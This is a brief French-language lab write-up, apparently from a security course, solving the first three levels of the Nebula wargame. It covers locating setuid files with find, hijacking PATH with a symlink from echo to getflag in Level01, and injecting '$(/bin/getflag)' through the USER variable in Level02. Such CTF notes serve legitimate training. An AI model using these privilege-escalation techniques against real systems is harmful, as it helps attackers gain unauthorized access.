# tp1_secu

**Level00**

level00@nebula:/bin/...$ find / -user flag00 2>/dev/null trouve flag00 partout
Le programme change le UID effectif et permet d'éxecuter un programme pour lequel on devrait pas avoir la permission (getflag)

CWE250:
The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses.


**Level01**

level01@nebula:/tmp$ ln -s /bin/getflag /tmp/echo on pointe echo vers le programme sensible en gardant le UID et GID. Quand echo sera appelé ça sera pas dans /usr/bin/env mais dans /bin/getflag

level01@nebula:/tmp$ export PATH=/tmp:$PATH on rajoute tmp dans le path pour que echo ait accès à notre redirection.

**Level02**

export USER='$(/bin/getflag)'
